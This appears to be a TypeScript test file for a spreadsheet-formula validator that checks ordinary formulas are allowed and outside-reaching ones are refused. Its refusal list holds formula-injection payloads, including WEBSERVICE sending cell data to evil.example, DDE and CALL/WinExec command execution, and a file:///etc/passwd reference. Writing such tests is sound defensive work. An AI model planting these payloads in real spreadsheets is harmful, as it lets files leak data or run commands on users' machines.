import assert from "node:assert/strict";
import { test } from "node:test";
import { formulaRefusal } from "./formula.ts";

test("arithmetic and lookups stay", () => {
  for (const f of [
    "=SUM(A1:A10)",
    "B2*1.21",
    "=IF(C3>100, \"over\", \"under\")",
    "=VLOOKUP(A2, Prices!A:B, 2, FALSE)",
    "=AVERAGE(Sheet2!B1:B40)",
    "=TEXT(NOW(), \"yyyy-mm-dd\")",
    "=A1&\" \"&B1",
  ]) {
    assert.equal(formulaRefusal(f), null, f);
  }
});

test("anything that reaches outside the workbook is refused", () => {
  for (const f of [
    "=HYPERLINK(\"https://evil.example\", \"click\")",
    "=hyperlink(A1)",
    "=WEBSERVICE(\"https://evil.example/\" & A1)",
    "=FILTERXML(WEBSERVICE(\"http://x\"), \"//a\")",
    "=IMPORTXML(\"https://x\", \"//a\")",
    "=IMAGE(\"https://x/a.png\")",
    "=cmd|' /C calc'!A0",
    "=DDE(\"cmd\", \"/c calc\", \"a\")",
    "='[Other.xlsx]Sheet1'!A1",
    "=RTD(\"prog\",,\"topic\")",
    "=CALL(\"kernel32\",\"WinExec\",\"JJ\",\"calc\",1)",
    "=\"file:///etc/passwd\"",
  ]) {
    assert.notEqual(formulaRefusal(f), null, f);
  }
});

test("nonsense is refused too", () => {
  assert.notEqual(formulaRefusal(""), null);
  assert.notEqual(formulaRefusal("=" + "A".repeat(2000)), null);
  assert.notEqual(formulaRefusal("=A1\u0007"), null);
});
